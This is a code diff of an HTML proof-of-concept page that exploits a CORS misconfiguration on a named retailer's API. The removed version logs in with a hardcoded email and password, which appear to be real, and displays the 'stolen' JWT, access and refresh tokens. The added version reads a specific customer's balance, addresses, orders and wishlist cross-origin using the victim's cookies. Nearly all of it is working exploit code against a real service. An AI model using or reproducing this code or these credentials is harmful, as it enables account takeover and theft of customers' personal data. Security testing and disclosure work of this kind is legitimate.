@@ -1,37 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Takealot CORS PoC</title>
+  <title>Takealot CORS PoC v2</title>
 </head>
 <body>
-<h1>Takealot CORS PoC 1.0</h1>
-<pre id="output">Loading...</pre>
+<h1>Takealot CORS PoC</h1>
+<p>
+  When a logged-in Takealot user visits this page, their session cookies are
+  sent automatically. The CORS misconfiguration on api.takealot.com allows this
+  cross-origin response to be read by attacker-controlled JavaScript.
+</p>
+
+<h2>Probe Results</h2>
+<pre id="probe">Running...</pre>
+
 <script>
-  fetch("https://api.takealot.com/rest/v-1-16-0/customers/login?section_id=customer_login", {
-    method: "POST",
-    credentials: "include",
-    headers: {
-      "Content-Type": "text/plain"
-    },
-    body: JSON.stringify({
-      email: "bettridgeconnor@gmail.com",
-      password: "Connor11connor11"
-    })
-  })
-  .then(r => r.json())
-  .then(data => {
-    const stolen = {
-      jwt: data.auth_info?.jwt,
-      access_token: data.auth_info?.access_token,
-      refresh_token: data.auth_info?.refresh_token,
-      customer_id: data.auth_info?.customer_id,
-      email: data.auth_info?.email
+// These endpoints were confirmed to reflect Access-Control-Allow-Origin
+// with credentials — meaning we can read the response body cross-origin.
+// The browser automatically sends the victim's session cookies on each request.
+const endpoints = [
+  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/credits/balance" },
+  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/summary" },
+  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/wishlist" },
+  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/addresses" },
+  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/orders" },
+];
+
+const results = [];
+
+async function run() {
+  for (const { method, url } of endpoints) {
+    try {
+      const r    = await fetch(url, { method, credentials: "include" });
+      const data = await r.json();
+      results.push({ url, status: r.status, cors: "READABLE", body: data });
+    } catch (e) {
+      results.push({ url, cors: "BLOCKED", error: String(e) });
     }
-    document.getElementById("output").innerText = JSON.stringify(stolen, null, 2)
-  })
-  .catch(err => {
-    document.getElementById("output").innerText = "Error: " + err
-  })
+    document.getElementById("probe").innerText = JSON.stringify(results, null, 2);
+  }
+}
+
+run();
 </script>
 </body>
 </html>
